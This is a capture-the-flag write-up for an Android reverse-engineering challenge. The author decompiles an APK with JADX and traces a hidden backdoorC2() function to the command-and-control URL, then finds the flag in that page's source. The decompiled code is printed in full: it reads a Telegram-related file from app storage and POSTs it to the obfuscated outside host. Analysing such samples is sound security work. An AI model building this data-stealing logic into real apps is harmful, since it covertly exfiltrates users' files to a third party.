# Proton X1337

_This file seems normal and safe. But it is actually maliciously, secretly transmitting data to a C2. Identify the server, and find the flag. Note: No brute forcing, nor scanning is required at all._

We are given an APK to analyze. This is probably the second time I've dealt with APKs in a CTF environment, so this question was a bit intimidating. I started off by opening the APK in JADX-GUI. In MainActivity(), there was a backdoorC2() function.\
<br>

```java
private final void backdoorC2() {
ThreadsKt.thread((31 & 1) != 0, (31 & 2) != 0 ? false : false, (31 & 4) != 0 ? null : null, (31 & 8) != 0 ? null : null, (31 & 16) != 0 ? -1 : 0, new Function0<Unit>() { // from class: com.example.protonx1337.MainActivity.backdoorC2.1
    {
        super(0);
    }

    @Override // kotlin.jvm.functions.Function0
    public /* bridge */ /* synthetic */ Unit invoke() throws IOException {
        invoke2();
        return Unit.INSTANCE;
    }

    /* renamed from: invoke, reason: avoid collision after fix types in other method */
    public final void invoke2() throws IOException {
        try {
            File baseTelegramDir = new File(MainActivity.this.getExternalFilesDir(null), LiveLiterals$MainActivityKt.INSTANCE.m5419x695a2287());
            File targetFile = new File(baseTelegramDir, LiveLiterals$MainActivityKt.INSTANCE.m5422x352a2295());
            String stolenContent = LiveLiterals$MainActivityKt.INSTANCE.m5427x71c6fad();
            if (targetFile.exists()) {
                stolenContent = StringsKt.replace$default(FilesKt.readText$default(targetFile, null, 1, null), LiveLiterals$MainActivityKt.INSTANCE.m5414x2146129b(), LiveLiterals$MainActivityKt.INSTANCE.m5423xdcef40ba(), false, 4, (Object) null);
            }
            String d1 = LiveLiterals$MainActivityKt.INSTANCE.m5425x506ff06();
            String d2 = LiveLiterals$MainActivityKt.INSTANCE.m5426xcc12e607();
            URLConnection uRLConnectionOpenConnection = new URL(d1 + d2).openConnection();
            Intrinsics.checkNotNull(uRLConnectionOpenConnection, "null cannot be cast to non-null type java.net.HttpURLConnection");
            HttpURLConnection connection = (HttpURLConnection) uRLConnectionOpenConnection;
            connection.setRequestMethod(LiveLiterals$MainActivityKt.INSTANCE.m5415xf204d679());
            connection.setDoOutput(LiveLiterals$MainActivityKt.INSTANCE.m5404xb9b2a8a0());
            connection.setRequestProperty(LiveLiterals$MainActivityKt.INSTANCE.m5416xd700fed(), LiveLiterals$MainActivityKt.INSTANCE.m5424x3d2743ee());
            byte[] telemetryPayload = StringsKt.trimIndent(LiveLiterals$MainActivityKt.INSTANCE.m5406xe0280da5() + stolenContent + LiveLiterals$MainActivityKt.INSTANCE.m5410x5139a9a7()).getBytes(Charsets.UTF_8);
            Intrinsics.checkNotNullExpressionValue(telemetryPayload, "this as java.lang.String).getBytes(charset)");
            OutputStream outputStream = connection.getOutputStream();
            try {
                OutputStream os = outputStream;
                os.write(telemetryPayload);
                Unit unit = Unit.INSTANCE;
                CloseableKt.closeFinally(outputStream, null);
                int responseCode = connection.getResponseCode();
                System.out.println((Object) (LiveLiterals$MainActivityKt.INSTANCE.m5407x6efccddf() + responseCode));
            } finally {
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
});
}
```

In this function, we can actually see the URL being constructed and a connection being opened.\
<br>

```java
String d1 = LiveLiterals$MainActivityKt.INSTANCE.m5425x506ff06();
String d2 = LiveLiterals$MainActivityKt.INSTANCE.m5426xcc12e607();
URLConnection uRLConnectionOpenConnection = new URL(d1 + d2).openConnection();
```

\
\
So, C2 Server is URL(d1 + d2). Navigating to LiveLiteral for the MainActivity, there is an if statement that changes the string value of the two variables.\
<br>

```java
public final String m5420xb46d800b() {
  if (!LiveLiteralKt.isLiveLiteralsEnabled()) {
      return f93xb46d800b;
  }
  State<String> stateLiveLiteral = f71xc665e98;
  if (stateLiveLiteral == null) {
      stateLiveLiteral = LiveLiteralKt.liveLiteral("String$arg-1$call-$init$$val-docDir$fun-initializeMediaStorage$class-MainActivity", f93xb46d800b);
      f71xc665e98 = stateLiveLiteral;
  }
  return stateLiveLiteral.getValue();
}

public final String m5421xb774b583() {
    if (!LiveLiteralKt.isLiveLiteralsEnabled()) {
        return f94xb774b583;
    }
    State<String> stateLiveLiteral = f72x93918590;
    if (stateLiveLiteral == null) {
        stateLiveLiteral = LiveLiteralKt.liveLiteral("String$arg-1$call-$init$$val-targetFile$fun-initializeMediaStorage$class-MainActivity", f94xb774b583);
        f72x93918590 = stateLiveLiteral;
    }
    return stateLiveLiteral.getValue();
}
```

After a quick Google search, LiveLiterals are always disabled by default in release-build APKs. So, we can deduce that the values would be\
<br>

```
d1 = f98x506ff06
d2 = f99xcc12e607
C2 server = f98x506ff06 + f99xcc12e607
```

Doing a string search, we can find the values of th strings

<div align="center"><img src="https://github.com/user-attachments/assets/aaa2b202-98df-4a4c-a86a-a0ffdbf0b96d" alt="image" height="150" width="600"></div>

So the C2 server is https://appsecmy.com/pages/liga-ctf-2026. But this is not the flag, let's take a look at the website.

<div align="center"><img src="https://github.com/user-attachments/assets/5847093b-4f38-426d-9fba-fc347be680eb" alt="image" width="563"></div>

Ahh yes, advertising. A quick look at the source code gives us the flag.

<div align="center"><img src="https://github.com/user-attachments/assets/5cdbb618-400a-4a38-96cd-7b04b175fe83" alt="image" width="563"></div>
